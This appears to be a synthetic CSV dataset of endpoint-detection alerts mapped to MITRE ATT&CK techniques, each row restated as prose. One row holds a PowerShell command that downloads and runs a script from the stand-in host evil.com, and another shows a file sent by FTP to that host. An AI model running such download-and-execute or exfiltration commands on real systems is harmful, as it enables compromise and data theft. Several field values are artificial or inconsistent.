AlertID,creationTimeUtc,AlertTimestamp,severity,category,status,AlertName,AlertDescription,recommendedActions,vendorInformation,properties,AlertCategory,AlertSeverity,Technique,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,ProcessCommandLine,DetectionMethod,RecommendedActions,source,tactic,device_name,action,file_name,file_size,src_path,dst_path,Severity,Name,Event,AlertType,MachineId,Category,AlertId,EventTime,ExtendedProperties,ComputerName,Status,AlertDetails,EndpointDetails,DetectionSource,DetectionID,EventHash,AffectedEntities,Tactic,KillChainPhase,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,hostname,ip_address,os,pid,command_line,access_type,operation,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessName,ParentProcessCommandLine,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,EntityType,EntityName,OS,References,KillChain,MachineDomainName,MachineName,AlertLink,Recommendation,Vendor,Product,Path,Hash,Protocol,SourceIp,SourcePort,DestinationIp,DestinationPort,DomainName,URL,Type,EndpointID,EndpointName,ParentProcessPath,ProcessPath,Source,Host,User,Target,Port,Action,Reason,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,TargetUser,OriginalPermissions,NewPermissions,Field,Operator,Value,Tags,InjectedProcessName,InjectionTechnique,ControlName,sha1_hash,file_path,process_name,process_path,HostIP,AdditionalInfo,RegistryKey,RegistryValue,CloudProvider,APIOperation,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,ProcessHash,Hostname,SourceIP,DestinationIP,AttackType,AttackDuration,AffectedServices,AffectedHostname,AlertSource,alert_severity,action_taken,detection_source,Affected_Hostname,Injected_Process_Name,Parent_Process_Name,Injection_Technique,Alert_Source,machine_id,user_id,process_id,process_command_line,alert_type,alert_name,remote_address,remote_port,local_address,local_port,protocol,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,IP,OSVersion,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,ParentCommandLine,EventID,ParentHash,ExecutionStatus,EntityValue,Condition,Description,Endpoint,RemediationSteps,EventId,ProcessId,CloudAccount,local_ip,public_ip,detection_method,file_hash,malware_family,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,AttackTactic,AttackTechnique,EntityId,EntityIp,Details,TimestampUtc,SHA256,WebServiceName,WebServicePath,type,vendor,path,domain,host,Affected_Device,Affected_User,Malicious_Executable,Username,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentName,ProcessParentID,ArtifactType,ArtifactPath,ArtifactName,AleertDescription,AlertTimestamps,native_function_calls,source_ip,destination_ip,process_hash,parent_process_name,parent_process_hash,Detection_Details,Process_Path,Process_Command_Line,AffectedFile_Path,AlertTime,UserInfo,PhishingInfo,AffectedImagePath,AffectedEndpoints,IndicatorsOfCompromise,Loader_Process_Name,Loader_Technique,ProcessParentPath,ProcessParentHash,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,MACAddress,AlertyDescription,EventLogName,EventLogMessage,OperatingSystem,FallbackProtocol,Alertescription,modified_time,original_hash,current_hash,RemoteServer,affected_host,alert_category,alert_recommendation,alert_details,RuleName,ProcessParentCommandLine,AttackVector,AlertTimestampUtc,WebServerUrl,WebServerMethod,technique,remote_ip,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,combined_data
ldkddfgh,,2022-03-07T16:47:13.0000000Z,,,,Access Removal,A privileged account was removed or disabled.,,,,,,,,,,,,,,,,,,,,,,,3,,,Behavior,12345,Threat,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Account Access Removal', 'AlertId': '12345', 'ThreatName': 'Account Access Removal', 'Severity': 'High', 'TimestampUtc': '2022-03-07T16:47:13.0000000Z', 'Tactic': 'Defense Evasion', 'Technique': 'Account Access Removal', 'AffectedEntities': {'User': [{'AccountName': 'example-account', 'SecurityIdentifier': 'S-1-5-21-1234567890-1234567890-1234567890-1001'}]}, 'CommandLine': 'net user example-account /active:no'}",example-hostname,New,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is ldkddfgh. AlertTimestamp is 2022-03-07T16:47:13.0000000Z. AlertName is Access Removal. AlertDescription is A privileged account was removed or disabled.. Severity is 3. AlertType is Behavior. MachineId is 12345. Category is Threat. ExtendedProperties AlertType is Behavior. ExtendedProperties BehaviorName is Account Access Removal. ExtendedProperties AlertId is 12345. ExtendedProperties ThreatName is Account Access Removal. ExtendedProperties Severity is High. ExtendedProperties TimestampUtc is 2022-03-07T16:47:13.0000000Z. ExtendedProperties Tactic is Defense Evasion. ExtendedProperties Technique is Account Access Removal. ExtendedProperties CommandLine is net user example-account /active:no. ComputerName is example-hostname. Status is New. 
445566778888,,2023-03-10T14:30:00.000Z,,,,Build Image on Host Detected,The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.,,,,Endpoint Detection and Response,,,,,,,,"""C:\Program Files\Docker\Docker\Docker Desktop.exe""",,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,docker,,,,192.168.1.100,,1234,5678,,,,,,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Program Files\Docker\Docker\Docker Desktop.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ExampleHost01,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Build Image on Host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 445566778888. AlertTimestamp is 2023-03-10T14:30:00.000Z. AlertName is Build Image on Host Detected. AlertDescription is The endpoint has detected an attempt to build an image on the host system. This behavior is consistent with the MITRE ATT&CK technique T1612.. AlertCategory is Endpoint Detection and Response. ProcessCommandLine is C:\Program Files\Docker\Docker\Docker Desktop.exe. Severity is High. ProcessName is docker. IPAddress is 192.168.1.100. ParentProcessName is powershell.exe. ParentProcessPath is C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe. ProcessPath is C:\Program Files\Docker\Docker\Docker Desktop.exe. Hostname is ExampleHost01. TechniqueName is Build Image on Host. Username is JohnDoe. 
99909,,2022-03-09T09:30:00.0000000Z,,,,Data Manipulation,Suspicious data manipulation activity was detected on the endpoint.,,,,,,,,,,,,,,,,,,,,,,,2,,,Behavior,12345,Suspicious,,,"{'AlertType': 'Behavior', 'BehaviorName': 'Data Manipulation', 'AlertId': '12345', 'ThreatName': 'Data Manipulation', 'Severity': 'Medium', 'TimestampUtc': '2022-03-09T09:30:00.0000000Z', 'MITRE': {'Tactic': ['Defense Evasion'], 'Technique': [{'Id': 'T1565', 'Name': 'Data Manipulation'}]}, 'AffectedEntities': {'Process': [{'ProcessId': 1234, 'ProcessCommandLine': 'C:\\Program Files\\example-app\\example-app.exe', 'ProcessStartTimeUtc': '2022-03-09T09:00:00.0000000Z', 'ProcessParentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessParentImageFileName': 'cmd.exe', 'ProcessGrandparentCommandLine': 'C:\\Windows\\system32\\cmd.exe /c start C:\\Program Files\\example-app\\example-app.exe', 'ProcessGrandparentImageFileName': 'cmd.exe'}], 'File': [{'FilePath': 'C:\\Windows\\Temp\\example-file.txt', 'FileName': 'example-file.txt', 'CreateTimeUtc': '2022-03-09T09:15:00.0000000Z', 'ModifyTimeUtc': '2022-03-09T09:20:00.0000000Z', 'SHA256Hash': 'ABC123...'}]}}",example-hostname,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 099909. AlertTimestamp is 2022-03-09T09:30:00.0000000Z. AlertName is Data Manipulation. AlertDescription is Suspicious data manipulation activity was detected on the endpoint.. Severity is 2. AlertType is Behavior. MachineId is 12345. Category is Suspicious. ExtendedProperties AlertType is Behavior. ExtendedProperties BehaviorName is Data Manipulation. ExtendedProperties AlertId is 12345. ExtendedProperties ThreatName is Data Manipulation. ExtendedProperties Severity is Medium. ExtendedProperties TimestampUtc is 2022-03-09T09:30:00.0000000Z. ComputerName is example-hostname. 
303345,,2022-04-05T08:32:15Z,,,,deployment of unauthorized container on host,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.,,,,Container Security,,Deploy Container,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,Host01,/usr/bin/docker,,docker run -itd unauthorized-image:latest,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,john.doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,unauthorized-image:latest,Docker,docker run,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0303345. AlertTimestamp is 2022-04-05T08:32:15Z. AlertName is deployment of unauthorized container on host. AlertDescription is This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.. AlertCategory is Container Security. Technique is Deploy Container. Severity is High. Tactic is Defense Evasion. HostName is Host01. FilePath is /usr/bin/docker. CommandLine is docker run -itd unauthorized-image:latest. User is john.doe. ContainerImageName is unauthorized-image:latest. ContainerRuntime is Docker. DeploymentMethod is docker run. 
99909090,,2023-03-10T12:00:00Z,,,,Execution Guardrails,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,John.Doe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign.,ABC123,Workstation-01,192.168.1.100,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 99909090. AlertTimestamp is 2023-03-10T12:00:00Z. AlertName is Execution Guardrails. Severity is High. OS is Windows 10. User is John.Doe. AlertDDescription is Adversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversarys campaign.. Endpoint_ID is ABC123. Endpoint_Name is Workstation-01. Endpoint_IP is 192.168.1.100. Process_Name is cmd.exe. 
9090,,2023-03-08T14:30:00Z,,,,Exfiltration Over C2 Channel Detected,This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.,,,,,,,,,,,,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,powershell.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,evil.com,SensitiveData.txt,HTTP,DOMAIN,explorer.exe,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0009090. AlertTimestamp is 2023-03-08T14:30:00Z. AlertName is Exfiltration Over C2 Channel Detected. AlertDescription is This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.. ProcessCommandLine is powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'). Severity is High. ProcessName is powershell.exe. UserName is JohnDoe. ProcessCreationTime is 2023-03-08T14:00:00Z. EndpointName is DESKTOP-ABC123. EndpointIP is 192.168.1.100. C2Server is evil.com. ExfiltratedData is SensitiveData.txt. ExfiltrationMethod is HTTP. UserDomain is DOMAIN. ProcessParentName is explorer.exe. 
30505,,2023-03-08T14:30:00Z,,,,Exfiltration Over Other Network Medium,This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.,,,,,,,,,,,,explorer.exe ftp://evil.com/SensitiveData.txt,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,FTP,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 00030505. AlertTimestamp is 2023-03-08T14:30:00Z. AlertName is Exfiltration Over Other Network Medium. AlertDescription is This alert is triggered when data exfiltration is detected over an alternative network medium on an endpoint.. ProcessCommandLine is explorer.exe ftp://evil.com/SensitiveData.txt. Severity is High. ProcessName is explorer.exe. UserName is JohnDoe. ProcessCreationTime is 2023-03-08T14:00:00Z. EndpointName is DESKTOP-ABC123. EndpointIP is 192.168.1.100. ExfiltratedData is SensitiveData.txt. ExfiltrationMethod is FTP. UserDomain is DOMAIN. 
oeoro5555,,2023-03-08T14:30:00Z,,,,Exfiltration Over Physical Medium ,This alert is triggered when data exfiltration is detected over a physical medium on an endpoint.,,,,,,,,,,,,explorer.exe copy SensitiveData.txt E:\,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,JohnDoe,1234,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,SensitiveData.txt,USB,DOMAIN,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is oeoro5555. AlertTimestamp is 2023-03-08T14:30:00Z. AlertName is Exfiltration Over Physical Medium . AlertDescription is This alert is triggered when data exfiltration is detected over a physical medium on an endpoint.. ProcessCommandLine is explorer.exe copy SensitiveData.txt E:\. Severity is High. ProcessName is explorer.exe. UserName is JohnDoe. ProcessCreationTime is 2023-03-08T14:00:00Z. EndpointName is DESKTOP-ABC123. EndpointIP is 192.168.1.100. ExfiltratedData is SensitiveData.txt. ExfiltrationMethod is USB. UserDomain is DOMAIN. 
ldsjfjg90,,2023-03-10T14:00:00Z,,,,Hide Artifacts,Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.,,,,,,Hide Artifacts,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,admin,,,Blocked,Attempt to hide malware file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,File,C:\Windows\system32\cmd.exe,malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is ldsjfjg90. AlertTimestamp is 2023-03-10T14:00:00Z. AlertName is Hide Artifacts. AlertDescription is Adversaries may attempt to hide artifacts associated with their behaviors to evade detection.. Technique is Hide Artifacts. Severity is High. Tactic is Defense Evasion. ProcessName is explorer.exe. Source is Endpoint. Host is server01. User is admin. Action is Blocked. Reason is Attempt to hide malware file. ArtifactType is File. ArtifactPath is C:\Windows\system32\cmd.exe. ArtifactName is malware.exe. 
234567,,2022-04-05T13:45:00Z,,,,Inter-Process Communication,,,,,,,,,,,,,,,"['Terminate the suspicious processes.', 'Review and block any network traffic associated with these processes.', 'Perform a full system scan to ensure no other malicious processes are running on the system.']",,,,,,,,,High,,,,,,,,,,,"Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.",,Defender for Endpoint EDR,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 234567. AlertTimestamp is 2022-04-05T13:45:00Z. AlertName is Inter-Process Communication. RecommendedActions are Terminate the suspicious processes.; Review and block any network traffic associated with these processes.; Perform a full system scan to ensure no other malicious processes are running on the system.; Severity is High. AlertDetails is Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.. DetectionSource is Defender for Endpoint EDR. Tactic is Defense Evasion. AleertDescription is Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. "
MDE-78901,,,Medium,,,Native OS Functions,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T15:43:21Z,"['NtOpenFile', 'NtCreateFile', 'NtReadFile']",192.168.1.151,192.168.1.150,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is MDE-78901. severity is Medium. AlertName is Native OS Functions. AlertDescription is Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.. process_name is explorer.exe. process_path is C:\Windows\explorer.exe. AlertTimestamps is 2022-10-31T15:43:21Z. native_function_calls are NtOpenFile; NtCreateFile; NtReadFile; source_ip is 192.168.1.151. destination_ip is 192.168.1.150. "
EDR-34567,,,High,,,Masked Executable,Masked executable detected on host COMPUTER-123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe /c C:\Users\user\Downloads\example.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\user\Downloads\example.exe,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5d41402abc4b2a76b9719d911017c592,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-10-31T00:12:34Z,,,,8ce9eaf907aedfcdff2c0a4d77a4c1f0,explorer.exe,e57597d202f73c0f6a4057f3d1a784b7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is EDR-34567. severity is High. AlertName is Masked Executable. AlertDescription is Masked executable detected on host COMPUTER-123. command_line is cmd.exe /c C:\Users\user\Downloads\example.exe. file_path is C:\Users\user\Downloads\example.exe. process_name is cmd.exe. file_hash is 5d41402abc4b2a76b9719d911017c592. AlertTimestamps is 2022-10-31T00:12:34Z. process_hash is 8ce9eaf907aedfcdff2c0a4d77a4c1f0. parent_process_name is explorer.exe. parent_process_hash is e57597d202f73c0f6a4057f3d1a784b7. 
6384095-,,2023-03-10T19:00:00Z,,,,Masquerade as a Legitimate Application,"Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.",,,,,,Masquerade as a Legitimate Application,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,explorer.exe,explorer.exe /c C:\Windows\system32\notepad.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,server01,user01,,,Blocked,Process attempted to execute an unauthorized file,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 6384095-. AlertTimestamp is 2023-03-10T19:00:00Z. AlertName is Masquerade as a Legitimate Application. AlertDescription is Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation.. Technique is Masquerade as a Legitimate Application. Severity is High. Tactic is Defense Evasion. ProcessName is explorer.exe. CommandLine is explorer.exe /c C:\Windows\system32\notepad.exe. Source is Endpoint. Host is server01. User is user01. Action is Blocked. Reason is Process attempted to execute an unauthorized file. "
304950,,2023-03-10T20:00:00Z,,,,Modify Registry,"Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.",,,,,,Modify Registry,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint,desktop01,user01,,,Blocked,Unauthorized modification of registry key,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 0304950. AlertTimestamp is 2023-03-10T20:00:00Z. AlertName is Modify Registry. AlertDescription is Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.. Technique is Modify Registry. Severity is High. Tactic is Defense Evasion. Source is Endpoint. Host is desktop01. User is user01. Action is Blocked. Reason is Unauthorized modification of registry key. RegistryKey is HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. "
